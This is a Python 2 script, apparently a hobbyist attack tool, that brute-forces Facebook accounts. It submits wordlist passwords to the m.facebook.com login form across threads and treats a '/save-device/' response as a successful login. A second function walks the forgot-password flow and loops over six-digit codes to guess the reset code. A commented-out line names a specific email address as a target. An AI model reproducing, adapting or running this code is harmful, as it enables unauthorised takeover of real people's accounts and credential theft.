#!/usr/bin/env python2
import os
from browser import Browser
import argparse
from colorama import *
import threading

ascii_p = """

                                                                                                                                     dddddddd
                                                                            lllllll                                                  d::::::d
                                                                            l:::::l                                                  d::::::d
                                                                            l:::::l                                                  d::::::d
                                                                            l:::::l                                                  d:::::d
   ooooooooooo vvvvvvv           vvvvvvv eeeeeeeeeeee    rrrrr   rrrrrrrrr   l::::l    ooooooooooo   rrrrr   rrrrrrrrr       ddddddddd:::::d
 oo:::::::::::oov:::::v         v:::::vee::::::::::::ee  r::::rrr:::::::::r  l::::l  oo:::::::::::oo r::::rrr:::::::::r    dd::::::::::::::d
o:::::::::::::::ov:::::v       v:::::ve::::::eeeee:::::eer:::::::::::::::::r l::::l o:::::::::::::::or:::::::::::::::::r  d::::::::::::::::d
o:::::ooooo:::::o v:::::v     v:::::ve::::::e     e:::::err::::::rrrrr::::::rl::::l o:::::ooooo:::::orr::::::rrrrr::::::rd:::::::ddddd:::::d
o::::o     o::::o  v:::::v   v:::::v e:::::::eeeee::::::e r:::::r     r:::::rl::::l o::::o     o::::o r:::::r     r:::::rd::::::d    d:::::d
o::::o     o::::o   v:::::v v:::::v  e:::::::::::::::::e  r:::::r     rrrrrrrl::::l o::::o     o::::o r:::::r     rrrrrrrd:::::d     d:::::d
o::::o     o::::o    v:::::v:::::v   e::::::eeeeeeeeeee   r:::::r            l::::l o::::o     o::::o r:::::r            d:::::d     d:::::d
o::::o     o::::o     v:::::::::v    e:::::::e            r:::::r            l::::l o::::o     o::::o r:::::r            d:::::d     d:::::d
o:::::ooooo:::::o      v:::::::v     e::::::::e           r:::::r           l::::::lo:::::ooooo:::::o r:::::r            d::::::ddddd::::::dd
o:::::::::::::::o       v:::::v       e::::::::eeeeeeee   r:::::r           l::::::lo:::::::::::::::o r:::::r             d:::::::::::::::::d
 oo:::::::::::oo         v:::v         ee:::::::::::::e   r:::::r           l::::::l oo:::::::::::oo  r:::::r              d:::::::::ddd::::d
   ooooooooooo            vvv            eeeeeeeeeeeeee   rrrrrrr           llllllll   ooooooooooo    rrrrrrr               ddddddddd   ddddd
"""

parser = argparse.ArgumentParser()
parser.add_argument('-u', metavar="user_id", type=str, nargs="?")
parser.add_argument('-p', metavar="pass_dir", type=str, nargs="?")
args = parser.parse_args()

url = "https://m.facebook.com"

def login_bruteforce(username, wordlist):
    browser = Browser()
    for password in wordlist:
        try:
            password = password.strip("\n")
            browser.open(url)
            response = browser.submit_form(form={'email': username, 'pass': password})
            verificatiion = "/save-device/" in response
            print(Fore.RED + "{0} => {1}: {2}".format(password, verificatiion, response) + Fore.WHITE)
            if verificatiion:
                print(Fore.GREEN + "{0} => {1}".format(password, verificatiion) + Fore.WHITE)
                exit()
        except KeyboardInterrupt:
            print("Exit Programme !")
            exit()


def dived(wordlist):
    newpassword = []
    if os.path.exists(wordlist):
        with open(str(wordlist), "r") as wordlist_file:
            list_of_password = wordlist_file.readlines()
            ndiv = len(list_of_password) // 2
            backup = []
            i = 0
            for pwd in list_of_password:
                backup.append(pwd)
                i += 1
                if i == ndiv:
                    newpassword.append(backup)
                    # reset variable
                    backup = []
                    i = 0
    return newpassword


def forgot_password_bruteforce(username, n_list):
    browser = Browser()
    try:
        # forgot password
        browser.open(url)

        forgot_password_link = browser.get_link_by_id('forgot-password-link')
        if forgot_password_link is not None:
            browser.open(forgot_password_link.base_url + forgot_password_link.url)

        # search account
        browser.select_form(nr=0)
        browser.form['email'] = username
        browser.submit()

        # use another way
        another_way_link = browser.get_link_by_text("Essayer")
        if another_way_link is not None:
            browser.open(another_way_link.base_url + another_way_link.url)

        # submit
        browser.select_form(nr=0)
        browser.submit()

        print(browser.response().read())
        exit()

        c = 0
        for i in range(999999):
            code = str(i)
            left = len(code) - 6
            for _ in range(left):
                code = "0" + code
            browser.submit_form(form={'n': code})
            if c == 3:
                break
            c += 1

    except KeyboardInterrupt:
        exit()


def start_multi_thread(username, wordlist):
    print(Fore.RED + ascii_p)
    the_wordlist = dived(wordlist)
    n_thread = [threading.Thread(target=login_bruteforce,  args=(username, wordlist_)) for wordlist_ in the_wordlist]
    print(Fore.GREEN + "Taille du wordlist: "+ Fore.WHITE + str(len(wordlist)))
    print(Fore.GREEN + "Nombre de Thread: " + Fore.WHITE + str(len(n_thread)))
    [th.start() for th in n_thread]

if __name__ == "__main__":
    start_multi_thread(args.u, args.p)
    # forgot_password_bruteforce(args.u, args.p)
    # forgot_password_bruteforce("24nomeniavo@gmail.com", 'test')

